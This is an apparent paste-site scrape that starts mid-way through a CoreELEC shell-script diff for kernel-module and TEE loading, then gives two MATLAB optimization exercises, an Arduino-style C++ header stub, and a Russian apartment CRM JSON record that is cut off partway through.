-  if [ -b /dev/mapper/dynpart-odm ]; then
-    mountpoint -q /android/odm  || mount -o ro /dev/mapper/dynpart-odm /android/odm
-    DOVI_KO=""/android/odm/lib/modules/dovi.ko""
-    if [ -f ${DOVI_KO} ]; then
-      modinfo ${DOVI_KO}
-
-      case $(dtname) in
-        *sei_smb_280*)
-          if check_dovi_version ${DOVI_KO} 5 4 210; then
-            insmod  ${DOVI_KO}
-          else
-            cat > /tmp/dovi.message << 'EOF'
+  local active_slot=$(fw_printenv active_slot 2>/dev/null | awk -F '=' '/active_slot=/ {print $2}')
+  [ ""${active_slot}"" = ""normal"" ] && active_slot="""" || active_slot=""_a""
+
+  if [ -b /dev/mapper/dynpart-odm${active_slot} ]; then
+    mountpoint -q /android/odm || mount -o ro /dev/mapper/dynpart-odm${active_slot} /android/odm
+
+    DOVI_KO_STORAGE=""/storage/dovi.ko""
+    DOVI_KO_ANDROID=""/android/odm/lib/modules/dovi.ko""
+    if [ -f ${DOVI_KO_ANDROID} ]; then
+      modinfo ${DOVI_KO_ANDROID}
+
+      if [ -f ${DOVI_KO_STORAGE} ]; then
+        message ""loading dovi module from ce storage partition""
+        modinfo ${DOVI_KO_STORAGE}
+        insmod ${DOVI_KO_STORAGE}
+      elif check_dovi_version ${DOVI_KO_ANDROID} 5 4 210; then
+        insmod ${DOVI_KO_ANDROID}
+      else
+        cat > /tmp/dovi.message << 'EOF'
 [TITLE]CoreELEC Dolby Vision Media Playback[/TITLE]
 [B][COLOR red]Android Dolby Vision kernel module is not compatible[/COLOR][/B]
 [COLOR red]No Dolby Vision media playback possible![/COLOR]
@@ -58,9 +65,7 @@ load_dovi_ne() {
 Please upgrade Android firmware of your device to minimum version 'v11.8.5310'.
 Dolby Vision media will be displayed in HDR instead Dolby Vision until the firmware fulfill the minimum requirements.
 EOF
-          fi
-        ;;
-      esac
+      fi
       return
     fi
   fi
diff --git a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh
index cd9e8f1dd7..2548a2d1f7 100755
--- a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh
+++ b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh
@@ -68,7 +68,8 @@ run_tee_from_android() {
   message ""run tee from android start""
 
   local active_slot=$(fw_printenv active_slot 2>/dev/null | awk -F '=' '/active_slot=/ {print $2}')
-  [ ""${active_slot}"" = ""normal"" ] && active_slot=""""
+  message ""fw active slot: '${active_slot}'""
+  [ ""${active_slot}"" = ""normal"" ] && active_slot="""" || active_slot=""_a""
 
   ! ls /dev/mapper/dynpart-* &>/dev/null && dmsetup create --concise ""$(parse-android-dynparts /dev/super)""
   mountpoint -q /android/system || mount -o ro /dev/mapper/dynpart-system${active_slot} /android/system
"
pPgGDY1r,Course 2 - Define variables and objective function,makispaiktis,MatLab,Monday 28th of August 2023 04:21:37 AM CDT,"clear all
close all
clc

% 1. Basics
prob = optimproblem(""Description"",""Factory Location"");
x = optimvar(""x"");
y = optimvar(""y"");
X = [5 40 70];
Y = [20 50 15];


% 2. Objective
d = sqrt((x - X) .^ 2 + (y -Y) .^ 2)        % 1 x 3 vector containing d1, d2, d3
dTotal = sum(d)
prob.Objective = dTotal;
show(prob)

% 3. Visualize
xvec = linspace(0,75);
yvec = linspace(0,75);
[x,y] = meshgrid(xvec,yvec);
distance = sqrt((x-X(1)).^2 + (y-Y(1)).^2)+...
    sqrt((x-X(2)).^2 + (y-Y(2)).^2)+...
    sqrt((x-X(3)).^2 + (y-Y(3)).^2);
contourf(x,y,distance)
ylabel(""Y-Coordinate"")
xlabel(""X-Coordinate"")
hold on
plot(X(1), Y(1), 'redX');
hold on
plot(X(2), Y(2), 'redX');
hold on
plot(X(3), Y(3), 'redX');
hold on
colorbar"
RWVyY4bp,serial.h,PaRat07,C++,Monday 28th of August 2023 04:19:27 AM CDT,"#define BIN 2
#define OCT 8
#define DEC 10
#define HEX 16

struct String {
    String(const char[]);
    String();
    char charAt(int) const;
    bool concat(String) const;
    bool compareTo(String) const;
    char* c_str();
    bool endsWith(String) const;
    bool equals(String) const;
    bool equalsIgnoreCase(String) const;
    void getBytes(std::byte*, unsigned) const;
    int indexOf(char) const;
    int indexOf(char, int) const;
    int indexOf(String) const;
    int indexOf(String, int) const;
    int lastIndexOf(char) const;
    int lastIndexOf(char, int) const;
    int lastIndexOf(String) const;
    int lastIndexOf(String, int) const;
    int length() const;
    void remove(int);
    void remove(int, int);
    void replace(String,String);
    void reserve(int);
    void setCharAt(int,char);
    bool startsWith(String) const;
    String substring(int,int) const;
    void toCharArray(char*, int) const;
    double toDouble() const;
    int toInt() const;
    float toFloat() const;
    void toLowerCase();
    void toUpperCase();
    void trim();
    char& operator[](int);
    const char& operator[](int) const;
    String operator+(const String&) const;
    void operator+=(const String&);
    String operator+(const char[]) const;
    void operator+=(const char[]);
    String operator+(char) const;
    void operator+=(char);
    String operator+(int) const;
    void operator+=(int);
    String operator+(double) const;
    void operator+=(double);
    String operator+(float) const;
    void operator+=(float);
    bool operator==(const String&) const;
    bool operator>(const String&) const;
    bool operator>=(const String&) const;
    bool operator<(const String&) const;
    bool operator<=(const String&) const;
    bool operator!=(const String&) const;
    bool operator==(const char[]) const;
    bool operator>(const char[]) const;
    bool operator>=(const char[]) const;
    bool operator<(const char[]) const;
    bool operator<=(const char[]) const;
    bool operator!=(const char[]) const;
    char* begin();
    char* end();
    const char* begin() const;
    const char* end() const;
};



namespace {
    struct serial_t {
        operator bool();
        bool available();
        bool availableForWrite();
        void begin(int);
        void end();
        bool find(char);
        bool find(char, size_t);
        bool findUntil(char, char);
        void flush();
        float parseFloat();
        int parseInt();
        int peek();
        size_t print(int, int);
        size_t print(double, int);
        template<class T>
        size_t print(T);
        size_t println(int, int);
        size_t println(double, int);
        template<class T>
        size_t println(T);
        int read();
        template<class T>
        size_t readBytes(T*, int);
        size_t readBytesUntil(char,char,int);
        String readString();
        String readStringUntil(char);
        void setTimeout(long);
        template<class T>
        size_t write(T);
        template<class T>
        size_t write(T*, int);
        void serialEvent();
    };
}
serial_t Serial;

void delay(int);"
sHYU0y4f,Course 1 - Create an optimization problem,makispaiktis,MatLab,Monday 28th of August 2023 04:12:20 AM CDT,"clear all
close all
clc

% 1. Create an empth optimization problem
prob = optimproblem(""Description"",""Factory Location"")
show(prob)

% 2. Create optimization variables
x = optimvar(""x"")
y = optimvar(""y"")"
HHddNjrJ,P0_O336604 [Квартира с ипотечным предложением 2],kirber,JSON,Monday 28th of August 2023 03:57:29 AM CDT,"{
   ""Source"":""crm"",
   ""Message"":"""",
   ""Id"":""0ff3bced-7f60-ed11-b822-005056b8a6c4"",
   ""Type"":""associate"",
   ""Time"":""2023-08-27T21:45:07"",
   ""Attributes"":{
      ""createdon"":""2022-11-10T01:43:44"",
      ""smt_actual_change_recordid"":{
         ""Id"":""6e7e4b1b-c27f-ed11-b822-005056b8a6d9"",
         ""LogicalName"":""smt_change_record"",
         ""Name"":""ЦК от 19.12.2022""
      },
      ""smt_address_number"":""15"",
      ""smt_amount_min"":null,
      ""smt_area_difference"":null,
      ""smt_auction_typecode"":null,
      ""smt_auctionbit"":false,
      ""smt_balconies"":null,
      ""smt_bathhousebit"":null,
      ""smt_bathroom_separate"":null,
      ""smt_bathroom_toilet"":null,
      ""smt_bedrooms_quantity"":null,
      ""smt_bti_balcony_area"":null,
      ""smt_bti_ceiling_height"":null,
      ""smt_bti_living_area"":null,
      ""smt_bti_number_int"":null,
      ""smt_bti_number_str"":null,
      ""smt_bti_total_area"":null,
      ""smt_bti_without_balcony_area"":null,
      ""smt_build_year"":null,
      ""smt_building_address_smt_construction_site_address"":""г. Москва, п. Рязановское, вблизи д.Алхимово   Комплексная жилая застройка с объектами социальной и инженерной инфраструктуры. Пятая очередь строительства:1-й этап – Жилой дом № 15, 2-й этап – Жилой дом № 16."",
      ""smt_building_address_smt_number"":""15"",
      ""smt_building_address_smt_post_address"":null,
      ""smt_building_addressid"":{
         ""Id"":""6b7f74a6-7d60-ed11-b824-005056b89b68"",
         ""LogicalName"":""smt_building_address"",
         ""Name"":""Алхимово, 5 очередь, Корпус  15""
      },
      ""smt_cadastral_number"":null,
      ""smt_ceiling_height"":null,
      ""smt_code"":""АЛХ5/1К15-01-02-01-001"",
      ""smt_construction_projectid"":{
         ""Id"":""07091659-2705-e911-80e5-005056b8d207"",
         ""LogicalName"":""smt_construction_project"",
         ""Name"":""АЛХИМОВО""
      },
      ""smt_construction_projectid_smt_construction_projectid"":""07091659-2705-e911-80e5-005056b8d207"",
      ""smt_construction_projectid_smt_region"":null,
      ""smt_construction_typecode"":null,
      ""smt_cottage_village"":null,
      ""smt_customer_agreementid"":null,
      ""smt_dachabit"":null,
      ""smt_description"":""Доля партнера"",
      ""smt_destination_typeid"":null,
      ""smt_discount_price"":null,
      ""smt_drainage_typecode"":null,
      ""smt_drainagebit"":null,
      ""smt_electricitybit"":null,
      ""smt_finishingcode"":100000001,
      ""smt_floor"":2,
      ""smt_floor_quantity"":null,
      ""smt_garagebit"":null,
      ""smt_gas_typecode"":null,
      ""smt_gasbit"":null,
      ""smt_heatingcode"":null,
      ""smt_hidden_basebit"":null,
      ""smt_home_conditioncode"":null,
      ""smt_house_typecode"":null,
      ""smt_image1"":null,
      ""smt_image2"":null,
      ""smt_land_categorycode"":null,
      ""smt_land_contractbit"":null,
      ""smt_land_statuscode"":null,
      ""smt_layout_url"":null,
      ""smt_liqcode"":null,
      ""smt_loggias"":null,
      ""smt_modelcode"":null,
      ""smt_object_sale_rentcode"":100000000,
      ""smt_object_sales_typecode"":null,
      ""smt_object_subtypecode"":100000003,
      ""smt_object_typecode"":100000000,
      ""smt_online_bookingbit"":true,
      ""smt_online_dealbit"":true,
      ""smt_owner_accountid_accountid"":""72f43c5f-2905-e911-80e5-005056b8d207"",
      ""smt_owner_accountid_smt_rightholder_typecode"":100000003,
      ""smt_percentage_min"":null,
      ""smt_phonebit"":null,
      ""smt_planning_solution_typecode"":null,
      ""smt_platform_number"":1,
      ""smt_poolbit"":null,
      ""smt_porch"":1,
      ""smt_price_min"":null,
      ""smt_primary_sale_agreementid"":null,
      ""smt_projected_balcony_area"":1.2600000000,
      ""smt_projected_kitchen_area"":null,
      ""smt_projected_living_area"":33.6000000000,
      ""smt_projected_number_int"":1,
      ""smt_projected_number_str"":""1"",
      ""smt_projected_total_area"":53.1500000000,
      ""smt_projected_without_balcony_area"":51.8900000000,
      ""smt_ready_rental_business_description"":null,
      ""smt_ready_rental_businessbit"":false,
      ""smt_real_estate_objectid"":""0ff3bced-7f60-ed11-b822-005056b8a6c4"",
      ""smt_reale_state_object_featureid"":{
         ""Id"":""cba29d30-b14f-ed11-b824-005056b89b68"",
         ""LogicalName"":""smt_real_estate_object_feature"",
         ""Name"":""3-52-Л-Д(1.1)""
      },
      ""smt_regionid_smt_name"":""Москва"",
      ""smt_related_real_estate_objectid"":null,
      ""smt_rent_cost"":2417.1200,
      ""smt_rent_price"":128469.9100,
      ""smt_rent_to_ownbit"":null,
      ""smt_repair_typecode"":null,
      ""smt_room_quantity"":3,
      ""smt_sale_cost"":199293.0000,
      ""smt_sale_individual"":null,
      ""smt_sale_legal_entity"":null,
      ""smt_sale_price"":10592422.9500,
      ""smt_sale_schemecode"":100000001,
      ""smt_sectionid"":{
         ""Id"":""aadef0b7-7d60-ed11-b823-005056b8a72c"",
         ""LogicalName"":""smt_section"",
         ""Name"":""АЛХ5/1К15-01""
      },
      ""smt_securitybit"":null,
      ""smt_settlement_name"":null,
      ""smt_smart_apartmentbit"":false,
      ""smt_start_cost"":null,
      ""smt_start_price"":null,
      ""smt_strategic_reserveid"":{
         ""Id"":""a4a56e9d-9529-e711-80c3-005056b8d207"",
         ""LogicalName"":""smt_strategic_reserve"",
         ""Name"":""не продавать""
      },
      ""smt_studio_typecode"":100000008,
      ""smt_supply_scheme_smt_name"":""АЛХИМОВО_Квартиры_Контейнер"",
      ""smt_supply_scheme_smt_online_dealbit"":false,
      ""smt_supply_scheme_smt_supply_schemeid"":""1ed3af2a-7089-ec11-b825-005056b8c05c"",
      ""smt_technical_real_estate_object"":100000001,
      ""smt_translate_lkbit"":null,
      ""smt_translate_to_websitebit"":true,
      ""smt_unit_quantity"":53.1500000000,
      ""smt_vendor_accountid"":{
         ""Id"":""72f43c5f-2905-e911-80e5-005056b8d207"",
         ""LogicalName"":""account"",
         ""Name"":""ООО «Специализированный застройщик «Самолет-Алхимово»""
      },
      ""smt_water_typecode"":null,
      ""smt_waterbit"":null,
      ""smt_wc_locationcode"":null,
      ""statecode"":0,
      ""statuscode"":100000001
   },
   ""LinkEntities"":{
      ""smt_room"":[
         {
            ""Id"":""74b0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000011,
               ""smt_display_order"":1,
               ""smt_name"":""Прихожая"",
               ""smt_roomid"":""74b0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":2.4400000000
            }
         },
         {
            ""Id"":""76b0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000011,
               ""smt_display_order"":2,
               ""smt_name"":""Коридор"",
               ""smt_roomid"":""76b0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":4.0800000000
            }
         },
         {
            ""Id"":""78b0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000012,
               ""smt_display_order"":3,
               ""smt_name"":""Кухня-ниша"",
               ""smt_roomid"":""78b0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":6.4700000000
            }
         },
         {
            ""Id"":""7ab0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000010,
               ""smt_display_order"":4,
               ""smt_name"":""Жилая комната_1"",
               ""smt_roomid"":""7ab0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":10.7400000000
            }
         },
         {
            ""Id"":""7cb0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000010,
               ""smt_display_order"":5,
               ""smt_name"":""Жилая комната_2"",
               ""smt_roomid"":""7cb0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":10.6100000000
            }
         },
         {
            ""Id"":""7eb0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000010,
               ""smt_display_order"":6,
               ""smt_name"":""Жилая комната_3"",
               ""smt_roomid"":""7eb0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":12.2500000000
            }
         },
         {
            ""Id"":""80b0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000014,
               ""smt_display_order"":7,
               ""smt_name"":""С/У_1"",
               ""smt_roomid"":""80b0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":4.0000000000
            }
         },
         {
            ""Id"":""82b0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:07"",
               ""smt_room_typecode"":100000003,
               ""smt_display_order"":8,
               ""smt_name"":""Постирочная"",
               ""smt_roomid"":""82b0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":1.3000000000
            }
         },
         {
            ""Id"":""84b0ec3c-8160-ed11-b824-005056b89b68"",
            ""Attributes"":{
               ""createdon"":""2022-11-10T01:53:08"",
               ""smt_room_typecode"":100000001,
               ""smt_display_order"":9,
               ""smt_name"":""Балкон"",
               ""smt_roomid"":""84b0ec3c-8160-ed11-b824-005056b89b68"",
               ""smt_projected_area"":1.2600000000
            }
         }
      ],
      ""smt_file"":[
         {
            ""Id"":""f7782034-0861-ed11-b823-005056b8a72c"",
            ""Attributes"":{
               ""smt_fileid"":""f7782034-0861-ed11-b823-005056b8a72c"",
               ""smt_hyperlink"":""https://sd-crm2fs.samoletgroup.ru:4433/plans/ДП_4/Алхимово/Корп. 15/Квартиры/1.jpg""
            }
         }
      ]
   },
   ""ManyMany"":{
      ""smt_real_estate_object_feature"":[
         ""5cd99544-9c67-e911-80e6-005056b8d207"",
         ""a0d99544-9c67-e911-80e6-005056b8d207"",
         ""f0d99544-9c67-e911-80e6-005056b8d207"",
         ""f6d99544-9c67-e911-80e6-005056b8d207"",
         ""509846d2-c912-ea11-80ed-005056b8d207""
      ],
      ""smt_realization_term"":[
         ""cdbd283c-7462-ed11-b823-005056b825cd"",
         ""94d51526-0a6b-ed11-b822-005056b8a6c4"",
         ""a99fc63f-2c8c-ed11-b827-005056b81dee"",
         ""75748bf4-f767-ed11-b826-005056b81dee"",
         ""1a38e938-f944-ee11-b828-005056b83cbb"",
         ""2638e938-f944-ee11-b828-005056b83cbb"",
         ""3238e938-f944-ee11-b828-005056b83cbb"",
         ""d237e938-f944-ee11-b828-005056b83cbb"",
         ""de37e938-f944-ee11-b828-005056b83cbb"",
         ""c637e938-f944-ee11-b828-005056b83cbb"",
         ""0238e938-f944-ee11-b828-005056b83cbb"",
         ""0e38e938-f944-ee11-b828-005056b83cbb"",
         ""e037e938-f944-ee11-b828-005056b83cbb"",
         ""f3df6e25-6e78-ed11-b822-005056b8a6d9"",
         ""586a23f1-0e59-ed11-b824-005056b83cbb"",
         ""5a6a23f1-0e59-ed11-b824-005056b83cbb"",
         ""506a23f1-0e59-ed11-b824-005056b83cbb"",
         ""526a23f1-0e59-ed11-b824-005056b83cbb"",
         ""546a23f1-0e59-ed11-b824-005056b83cbb"",
         ""566a23f1-0e59-ed11-b824-005056b83cbb"",
         ""b3df3c87-ed49-ed11-b823-005056b825cd"",
         ""7adefaa3-820d-ed11-b826-005056b81dee"",
         ""84defaa3-820d-ed11-b826-005056b81dee"",
         ""8edefaa3-820d-ed11-b826-005056b81dee"",
         ""98defaa3-820d-ed11-b826-005056b81dee"",
         ""a2defaa3-820d-ed11-b826-005056b81dee"",
         ""acdefaa3-820d-ed11-b826-005056b81dee"",
         ""49b88abb-8ef7-ec11-b822-005056b8a6d9"",
         ""d99081e7-8ef7-ec11-b822-005056b8a6d9"",
         ""50a4fd3f-983a-ed11-b823-005056b825cd"",
         ""52a4fd3f-983a-ed11-b823-005056b825cd"",
         ""d46ca973-98c7-ec11-b826-005056b81dee"",
         ""c2bf64f0-1bbf-ec11-b823-005056b8a72c"",
         ""e1e34f44-dbbb-ec11-b822-005056b8a6c4"",
         ""29d2fada-fcbb-ec11-b822-005056b8a6c4"",
         ""1f82d4b8-8518-ed11-b824-005056b89b68"",
         ""3a14ac33-99b5-ec11-b826-005056b81dee"",
         ""d08c0c22-951f-ed11-b822-005056b8a6d9"",
         ""fb6cd8b9-941f-ed11-b822-005056b8a6d9"",
         ""71ade8f2-88da-ec11-b824-005056b89b68"",
         ""54a4fd3f-983a-ed11-b823-005056b825cd"",
         ""56a4fd3f-983a-ed11-b823-005056b825cd"",
         ""0eec79a6-d54b-ed11-b823-005056b8a72c"",
         ""31960c93-d54b-ed11-b823-005056b8a72c"",
         ""017439a4-d64b-ed11-b823-005056b8a72c"",
         ""b91d0c92-d64b-ed11-b823-005056b8a72c"",
         ""ab60ec9c-975d-ec11-8121-005056b8d207"",
         ""a360ec9c-975d-ec11-8121-005056b8d207"",
         ""56ff8bdf-8956-ed11-b823-005056b8a72c"",
         ""50253f4e-d864-ed11-b824-005056b8a72c"",
         ""8eb9edc8-004b-ed11-b826-005056b81dee"",
         ""6b47e1d6-f816-ed11-b822-005056b8a6c4"",
         ""6f47e1d6-f816-ed11-b822-005056b8a6c4"",
         ""86596baa-5dac-ec11-b823-005056b825cd"",
         ""641574ca-5dac-ec11-b823-005056b825cd"",
         ""29d5b037-5dac-ec11-b823-005056b825cd"",
         ""910c8a08-1630-ed11-b822-005056b8a6c4"",
         ""e6cdb9e9-1630-ed11-b822-005056b8a6c4"",
         ""311e9403-deb4-ec11-b826-005056b81dee"",
         ""6ada1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""60da1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""56da1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""4cda1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""42da1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""38da1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""2eda1cf9-3cb7-ec11-b822-005056b8a6d9"",
         ""b6defaa3-820d-ed11-b826-005056b81dee"",
         ""15e4cb21-3425-ed11-b826-005056b81dee"",
         ""4decaa46-f16b-ed11-b826-005056b81dee"",
         ""448fe471-6d5e-ed11-b823-005056b8a72c"",
         ""c3f1dad1-341d-ed11-b823-005056b8a72c"",
         ""c1f1dad1-341d-ed11-b823-005056b8a72c"",
         ""bff1dad1-341d-ed11-b823-005056b8a72c"",
         ""bdf1dad1-341d-ed11-b823-005056b8a72c"",
         ""bbf1dad1-341d-ed11-b823-005056b8a72c"",
         ""b9f1dad1-341d-ed11-b823-005056b8a72c"",
         ""b7f1dad1-341d-ed11-b823-005056b8a72c"",
         ""b5f1dad1-341d-ed11-b823-005056b8a72c"",
         ""b3f1dad1-341d-ed11-b823-005056b8a72c"",
         ""b1f1dad1-341d-ed11-b823-005056b8a72c"",
         ""aff1dad1-341d-ed11-b823-005056b8a72c"",
         ""adf1dad1-341d-ed11-b823-005056b8a72c"",
         ""abf1dad1-341d-ed11-b823-005056b8a72c"",
         ""a9f1dad1-341d-ed11-b823-005056b8a72c"",
         ""a7f1dad1-341d-ed11-b823-005056b8a72c"",
         ""a5f1dad1-341d-ed11-b823-005056b8a72c"",
         ""a3f1dad1-341d-ed11-b823-005056b8a72c"",
         ""a1f1dad1-341d-ed11-b823-005056b8a72c"",
         ""9ff1dad1-341d-ed11-b823-005056b8a72c"",
         ""9df1dad1-341d-ed11-b823-005056b8a72c"",
         ""9bf1dad1-341d-ed11-b823-005056b8a72c"",
         ""99f1dad1-341d-ed11-b823-005056b8a72c"",
         ""97f1dad1-341d-ed11-b823-005056b8a72c"",
         ""95f1dad1-341d-ed11-b823-005056b8a72c"",
         ""93f1dad1-341d-ed11-b823-005056b8a72c"",
         ""91f1dad1-341d-ed11-b823-005056b8a72c"",
         ""8ff1dad1-341d-ed11-b823-005056b8a72c"",
         ""8df1dad1-341d-ed11-b823-005056b8a72c"",
         ""8bf1dad1-341d-ed11-b823-005056b8a72c"",
         ""89f1dad1-341d-ed11-b823-005056b8a72c"",
         ""87f1dad1-341d-ed11-b823-005056b8a72c"",
         ""85f1dad1-341d-ed11-b823-005056b8a72c"",
         ""baca2d5a-0e4e-ed11-b824-005056b89b68"",
         ""a28687ec-d62a-ed11-b823-005056b825cd"",
         ""da13f4b7-ea81-ed11-b824-005056b89b68"",
         ""0029c866-486b-ed11-b822-005056b8a6c4"",
         ""1a8d99d9-483e-ed11-b824-005056b89b68"",
         ""188d99d9-483e-ed11-b824-005056b89b68"",
         ""72e985b6-6ee6-ec11-b822-005056b8a6d9"",
         ""d24b3ddc-9bb5-ec11-b826-005056b81dee"",
         ""7b8608b8-7740-ec11-8120-005056b8d207"",
         ""638608b8-7740-ec11-8120-005056b8d207"",
         ""fff67f16-568a-ec11-8121-005056b8d207"",
         ""598f6399-1675-ec11-8121-005056b8d207"",
         ""20e1f104-0c75-ec11-8121-005056b8d207"",
         ""dfa58d8a-0a75-ec11-8121-005056b8d207"",
         ""9a133d0f-b068-ec11-8121-005056b8d207"",
         ""1aad399a-9a61-ec11-8121-005056b8d207"",
         ""868eb42c-9559-ec11-8121-005056b8d207"",
         ""5646ca5d-c04d-ec11-8120-005056b8d207"",
         ""b472239f-20db-eb11-8120-005056b8d207"",
         ""d04d84d4-0dbe-eb11-8120-005056b8d207"",
         ""13a54ba9-19b3-eb11-811e-005056b8d207"",
         ""56503a17-49a1-ec11-b821-005056b8a6d9"",
         ""8759a9d3-46a1-ec11-b821-005056b8a6d9"",
         ""0afab293-a0a3-ec11-b821-005056b8a6c4"",
         ""4efebdf6-69ae-ec11-b824-005056b89b68"",
         ""31ea5fc6-e0a0-eb11-8119-005056b8d207"",
         ""27123c77-56a0-ec11-b821-005056b8a6c4"",
         ""6c6c4fe5-9c5c-eb11-810b-005056b8d207"",
         ""ce76864b-7260-eb11-810b-005056b8d207"",
         ""0dce33af-b893-eb11-8117-005056b8d207"",
         ""58e0b397-314d-ec11-8120-005056b8d207"",
         ""b0e67048-c0bf-ec11-b823-005056b8a72c"",
         ""9ee67048-c0bf-ec11-b823-005056b8a72c"",
         ""8ce67048-c0bf-ec11-b823-005056b8a72c"",
         ""7ae67048-c0bf-ec11-b823-005056b8a72c"",
         ""68e67048-c0bf-ec11-b823-005056b8a72c"",
         ""dce8d7ad-4869-ec11-8121-005056b8d207"",
         ""c2e8d7ad-4869-ec11-8121-005056b8d207"",
         ""a8e8d7ad-4869-ec11-8121-005056b8d207"",
         ""8ee8d7ad-4869-ec11-8121-005056b8d207"",
         ""6ee8d7ad-4869-ec11-8121-005056b8d207"",
         ""4ee8d7ad-4869-ec11-8121-005056b8d207"",
         ""6bb9edbc-2dd3-eb11-8120-005056b8d207"",
         ""15a1fd2c-a70f-ec11-8120-005056b8d207"",
         ""13a1fd2c-a70f-ec11-8120-005056b8d207"",
         ""11a1fd2c-a70f-ec11-8120-005056b8d207"",
         ""e228c635-0712-ec11-8120-005056b8d207"",
         ""65fd0fcc-1b66-eb11-810b-005056b8d207"",
         ""2b533332-2715-ec11-8120-005056b8d207"",
         ""bb3c4726-b77d-ec11-8121-005056b8d207"",
         ""78710a4b-76ae-ec11-b822-005056b8a6d9"",
         ""35854157-2e38-ed11-b822-005056b8a6d9"",
         ""05a313a3-11b0-ec11-b822-005056b8a6d9"",
         ""59e5042b-f798-ea11-80f8-005056b8d207"",
         ""077416a8-1792-eb11-8116-005056b8d207"",
         ""1ddb094d-1bc0-ea11-80fb-005056b8d207"",
         ""6d06f920-1e65-ea11-80f7-005056b8d207"",
         ""687522e3-abe3-eb11-8120-005056b8d207"",
         ""7510e772-6f16-ea11-80ed-005056b8d207"",
         ""59a67891-e4e4-e911-80eb-005056b8d207"",
         ""af5bf0f8-e5e4-e911-80eb-005056b8d207"",
         ""2d0fa286-1868-ea11-80f7-005056b8d207"",
         ""7a471b0c-766f-ea11-80f7-005056b8d207"",
         ""d104ffcf-fb21-ec11-8120-005056b8d207"",
         ""0cc3ef15-5b20-ec11-8120-005056b8d207"",
         ""ece10fa9-ae04-eb11-80fc-005056b8d207"",
         ""2f1e9403-deb4-ec11-b826-005056b81dee"",
         ""8d568601-07bb-ec11-b822-005056b8a6c4"",
         ""3613f11e-97ec-ec11-b823-005056b8a72c"",
         ""fbe53dea-dfb4-ec11-b824-005056b89b68"",
         ""60382680-0a70-ed11-b824-005056b8a72c"",
         ""899c41ac-0a70-ed11-b824-005056b8a72c"",
         ""57cfd3bf-0b70-ed11-b824-005056b8a72c"",
         ""37f1b43b-d34b-ed11-b823-005056b8a72c"",
         ""19817adb-d24b-ed11-b823-005056b8a72c"",
         ""166d8a33-d44b-ed11-b823-005056b8a72c"",
         ""3a2bb4c6-d34b-ed11-b823-005056b8a72c"",
         ""51616b2f-0c70-ed11-b824-005056b8a72c"",
         ""52bf595e-4781-ed11-b824-005056b89b68"",
         ""012d68a4-5381-ed11-b824-005056b89b68"",
         ""26190c39-bf82-ed11-b824-005056b8a72c"",
         ""150b9ffa-be82-ed11-b824-005056b8a72c"",
         ""24967cfc-d082-ed11-b824-005056b8a72c"",
         ""eab5d3b6-4166-ed11-b822-005056b8a6c4"",
         ""c719f9dc-4066-ed11-b822-005056b8a6c4"",
         ""89229bb9-d1bb-ec11-b822-005056b8a6c4"",
         ""1388ddbb-4466-ed11-b822-005056b8a6c4"",
         ""75fa1539-07f2-ec11-b826-005056b81dee"",
         ""b2387265-07f2-ec11-b826-005056b81dee"",
         ""c7b374b3-8406-ed11-b826-005056b81dee"",
         ""4137652a-8706-ed11-b826-005056b81dee"",
         ""730a551b-fd3e-ed11-b826-005056b81dee"",
         ""4e7868aa-f237-ed11-b826-005056b81dee"",
         ""7d0a551b-fd3e-ed11-b826-005056b81dee"",
         ""790a551b-fd3e-ed11-b826-005056b81dee"",
         ""770a551b-fd3e-ed11-b826-005056b81dee"",
         ""750a551b-fd3e-ed11-b826-005056b81dee"",
         ""7f0a551b-fd3e-ed11-b826-005056b81dee"",
         ""810a551b-fd3e-ed11-b826-005056b81dee"",
         ""830a551b-fd3e-ed11-b826-005056b81dee"",
         ""850a551b-fd3e-ed11-b826-005056b81dee"",
         ""8d0a551b-fd3e-ed11-b826-005056b81dee"",
         ""8b0a551b-fd3e-ed11-b826-005056b81dee"",
         ""890a551b-fd3e-ed11-b826-005056b81dee"",
         ""870a551b-fd3e-ed11-b826-005056b81dee"",
         ""8f0a551b-fd3e-ed11-b826-005056b81dee"",
         ""910a551b-fd3e-ed11-b826-005056b81dee"",
         ""930a551b-fd3e-ed11-b826-005056b81dee"",
         ""950a551b-fd3e-ed11-b826-005056b81dee"",
         ""970a551b-fd3e-ed11-b826-005056b81dee"",
         ""141374d7-aa23-ed11-b823-005056b825cd"",
